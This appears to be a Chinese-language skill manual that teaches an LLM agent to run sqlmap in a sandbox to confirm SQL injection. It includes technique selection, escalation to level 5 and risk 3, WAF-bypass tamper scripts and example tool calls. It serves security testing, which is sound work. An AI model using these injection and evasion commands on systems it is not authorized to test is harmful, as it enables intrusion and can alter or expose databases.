---
name: tooling/sqlmap
description: |
  sqlmap 工具手册。教 LLM 如何拼 sqlmap 命令验证 SQLi（错误注入 / 布尔盲注 / 时间盲注 /
  UNION），怎么解读 stdout 关键字段，怎么从默认参数渐进升级到 --level 5 / --risk 3 / --tamper
  绕 WAF。配合 run_command 工具使用。
---

# sqlmap 用法手册

sqlmap 是 SQL 注入自动化工具，命令形态 `sqlmap -u <URL> -p <字段> [--cookie ...] [...]`。
通过 `run_command(command="sqlmap ...")` 在沙箱容器里跑。

## ⚠️ 容器内 host 改写规则（必读）

`run_command` 在 docker 沙箱里跑，容器内 `127.0.0.1` / `localhost` 指向**容器自己**，不是宿主机。
拼 sqlmap `-u` 时**必须**改写：

| user prompt 里的 host 形态 | sqlmap `-u` 实际写 |
|---|---|
| `127.0.0.1:<port>` / `localhost:<port>`（环回地址） | `host.docker.internal:<port>` |
| 私网 IP（`10.*` / `172.16-31.*` / `192.168.*`，宿主机本身的 LAN IP） | `host.docker.internal:<port>` |
| 公网 IP / 公网域名（如 `api.example.com`、`203.0.113.5:443`） | 原样保留 |
| 内网域名（如 `internal.app.local`） | 原样保留——只要容器 DNS 能解析就行 |

curl / python3 / sh 工具调本地（宿主）服务时**同样适用**这条改写。
判断标准：**目标是否就跑在执行 scanner 的同一台机器上**——是 → 改写；否 → 原样。

## 核心调用模板

```
sqlmap -u "<URL>" -p <field> --cookie="<cookie>" --batch --disable-coloring [其他 flag]
```

**必带的三个 flag**：

- `--batch`：所有交互全用默认值，否则会卡在 stdin
- `--disable-coloring`：禁掉 ANSI 颜色码，stdout_tail 才能干净 grep
- `-p <field>`：指定测试参数；不指定会扫所有，慢且嘈

⚠️ **`-u` URL 必须完整（最常见假阴性来源）**：
即使 query 中有 `Submit` / `csrf_token` / `page` 等"控制字段"，**也要原样保留在 URL 里**——很多后端（PHP form / GET 表单 / 框架路由）**只在所有原始 query 齐全时才执行业务逻辑**。漏掉这些 → sqlmap 各 payload 拿到的都是空表单 / 错误页 → 判 "not injectable"（典型假阴）。
`-p <field>` 只决定**测哪个参数**，不影响 URL 完整性。

## 关键参数速查

### 目标 / 凭证

| 参数 | 用途 | 示例 |
|---|---|---|
| `-u` | 目标 URL | `-u "http://api.example.com/v1/products?id=1"` |
| `-p` | 测试参数名 | `-p id` |
| `--cookie` | 认证 cookie | `--cookie="session=<token>"`（看 user prompt 里实际 cookie 名/值套用） |
| `--header` | 自定义 header（含 Authorization、X-API-Key 等 token 鉴权） | `--header="Authorization: Bearer <token>"` |
| `--user-agent` | 自定义 UA | `--user-agent="..."` |
| `--data` | POST body | `--data="user=admin&pass=x"` |
| `--method` | HTTP 方法 | `--method=PUT` |

### 激进度

| 参数 | 默认 | 含义 |
|---|---|---|
| `--level` | 1 | 1-5；越高 payload 集越广（5 含 cookie/UA/Referer 注入） |
| `--risk` | 1 | 1-3；3 会带 OR-based 等可能改库的 payload（生产慎用） |
| `--threads` | 1 | 并发；3-5 较快但易触发 rate-limit |
| `--time-sec` | 5 | time-based 盲注延迟基线；网络抖动大时上调到 10 |

### 限定技术（按 SKILL 决策树选）

| `--technique` 字符 | 含义 | 适用 body 信号 |
|---|---|---|
| `B` | Boolean-based blind | 真假命题 body 显著差异 |
| `E` | Error-based | body 含 SQL 语法错误关键字 |
| `U` | UNION query | 已知列数 / 看到原数据回显 |
| `S` | Stacked queries | 支持 ; 分号多语句（少见，多 MSSQL） |
| `T` | Time-based blind | 真假命题 body 完全相同但响应时间差异 |
| `Q` | Inline queries | 嵌入子查询 |

例：`--technique=BE`（仅布尔+报错）、`--technique=T`（仅时间盲注）。
**不传等于跑全部 5 类**，慢且 noisy；按 body 信号针对性选能省 60%+ 时间。

### 绕过 WAF / 输入过滤

`--tamper` 可叠加多个 tamper 脚本，逗号分隔：

| tamper | 用途 |
|---|---|
| `space2comment` | 空格 → /\*\*/，绕"过滤空格" |
| `between` | `=` → `BETWEEN x AND y`，绕等号过滤 |
| `randomcase` | 关键字大小写打乱（`SeLeCt`），绕大小写过滤 |
| `charencode` | URL 编码所有非字母数字字符 |
| `space2plus` | 空格 → +，绕空格过滤 |
| `equaltolike` | `=` → `LIKE`，绕等号过滤 |
| `apostrophenullencode` | `'` → `%00%27`，绕引号过滤 |

例：`--tamper=space2comment,randomcase`。

### 输出 / 控制

| 参数 | 用途 |
|---|---|
| `-v 0` | 静默输出（默认 1）；想看更多用 `-v 2` |
| `--output-dir=/tmp/sqlmap` | 落盘目录，容器 --rm 时无所谓 |
| `--flush-session` | 清缓存重跑（默认 sqlmap 会复用上次结果） |
| `--keep-alive` | 复用 TCP 连接 |

## 输出关键字段（grep stdout_tail）

sqlmap 跑成功时，stdout 会出现这些关键短语——LLM 读 `stdout_tail` 用 grep 思路提取：

| 关键字 | 含义 | 示例 |
|---|---|---|
| `Title:` | 注入类型 | `Title: MySQL >= 5.0 AND error-based - WHERE...` |
| `Payload:` | 精确触发 payload | `Payload: id=1' AND (SELECT 2472 FROM ...` |
| `back-end DBMS` | 数据库类型 | `back-end DBMS: MySQL >= 5.0` / `PostgreSQL` / `Oracle` |
| `Type:` | 技术分类 | `Type: error-based` / `Type: time-based blind` |
| `parameter ... is vulnerable` | 直接确认句 | `parameter 'id' is vulnerable` |
| `sqlmap identified the following injection point` | 找到入口 | 后续若干行就是 Title/Type/Payload |
| `all tested parameters do not appear to be injectable` | 否认 | 所有参数没注入；考虑升级 level/risk |

否认信号：

| 关键字 | 含义 |
|---|---|
| `do not appear to be injectable` | 当前 level/risk 没复现 |
| `try to increase values for '--level'/'--risk'` | sqlmap 自己提示升级 |
| `connection timed out` / `unable to connect` | 网络问题，不是 SQLi 否认 |
| `429` 在 stderr | rate-limit；降 --threads / 加 --delay |

## 渐进升级策略（按 body_hint 信号选起点）

### 起点 1：默认 level=1 / risk=1

```bash
sqlmap -u "http://api.example.com/v1/products?id=1" -p id --cookie="session=<token>" --batch --disable-coloring
```

90% 普通 SQLi 默认即坐实。**先跑这条**，再考虑升级。

### 起点 2：error-based 信号 → 限定 E + 升 level

body_hint 已含 `You have an error in your SQL syntax` / `pg_query():` / `unclosed quotation mark`：

```bash
sqlmap -u "..." -p id --cookie="..." --batch --disable-coloring \
  --technique=E --level=5 --risk=2
```

### 起点 3：布尔差分信号 → 限定 B

`bool_true` body 与 baseline 几乎相同，`bool_false` 显著不同（结果集 vs 空）：

```bash
sqlmap -u "..." -p id --cookie="..." --batch --disable-coloring \
  --technique=B --level=3 --string="<bool_true 独有的关键词>"
```

`--string` 让 sqlmap 用关键词命中判断真假，比默认更准。

### 起点 4：时间侧信道 → 限定 T

各 variant body 完全相同，但 `bool_true`/`bool_false` 响应时间差 1-2 秒：

```bash
sqlmap -u "..." -p id --cookie="..." --batch --disable-coloring \
  --technique=T --time-sec=5 --level=3
```

### 起点 5：默认否认 + 怀疑 WAF → 加 tamper

默认参数说 not injectable，但 body_hint 有报错信号 → 大概率被 WAF 改写了 payload：

```bash
sqlmap -u "..." -p id --cookie="..." --batch --disable-coloring \
  --tamper=space2comment,between,randomcase --level=5 --risk=3
```

逐个加 tamper（先 1 个再 2 个），别一上来 5 个齐发——会把 sqlmap 拖到 timeout。

### 起点 6：强制重跑（清缓存）

sqlmap 默认缓存上次会话，参数变了但没重测：

```bash
sqlmap -u "..." -p id --batch --flush-session --disable-coloring [...]
```

## 实战示例

### 示例 1：GET query 参数（cookie 鉴权）

```
run_command({
  "command": "sqlmap -u 'http://api.example.com/v1/products?id=1&category=books' -p id --cookie='session=<token>' --batch --disable-coloring --level=2",
  "tag": "sqlmap-default",
  "timeout_seconds": 180
})
```

期望 stdout_tail 含 `Title: ... error-based - WHERE...` → vulnerable=true。
（实际 host/path/cookie 名按 user prompt 里抓到的真实值套用。）

### 示例 2：POST JSON（Bearer token 鉴权）

```
run_command({
  "command": "sqlmap -u 'http://api.example.com/v1/login' --data='{\"user\":\"admin\",\"pass\":\"x\"}' --header='Content-Type: application/json' --header='Authorization: Bearer <token>' -p user --batch --disable-coloring",
  "tag": "sqlmap-json"
})
```

注意 JSON body 里的 `"` 在 shell 里要 `\"` 转义。

### 示例 3：升级到 level=5 + tamper

```
run_command({
  "command": "sqlmap -u 'http://api.example.com/v1/products?id=1' -p id --cookie='session=<token>' --batch --disable-coloring --level=5 --risk=3 --tamper=space2comment,between --technique=BE --flush-session",
  "tag": "sqlmap-upgrade",
  "timeout_seconds": 300
})
```

### 示例 4：仅 grep 关键行（节省 stdout_tail 空间）

如果 sqlmap 输出过长 1.5KB tail 装不下关键 Title/Payload：

```
run_command({
  "command": "sqlmap -u '...' -p id --cookie='...' --batch --disable-coloring 2>&1 | grep -E '(Title|Payload|back-end DBMS|injectable|vulnerable):'",
  "tag": "sqlmap-grep"
})
```

## 常见坑

1. **不带 `--batch` 必卡死**：sqlmap 会问"do you want to keep testing the others (Y/n)"，stdin 没法答 → 容器 timeout
2. **不带 `--disable-coloring` 时 stdout 含 ANSI 转义码**：grep `Title:` 会失败因为字符串里塞了 `\x1b[36m`
3. **缓存陷阱**：跑过一次后改参数再跑 sqlmap 直接读缓存。要清就 `--flush-session`
4. **`-p` 必传**：不传扫所有参数（含表单的 csrf_token / submit / page 等无意义字段），会浪费 80% 时间扫无关字段
5. **timeout 估算**：默认 level=1 大概 30-90s；level=5 + tamper + 多 technique 可能 200-500s。本工具 timeout 上限 300s，所以激进扫 splits 成两次跑（先 technique=E，再 technique=BT）
6. **`--threads >5` 慎用**：易触发 rate-limit / WAF，sqlmap 的"is the back-end DBMS"探测会误判
7. **`--technique` 字符顺序无关**：`BE` 和 `EB` 等价；但**不传等于跑全部**——务必显式传需要的
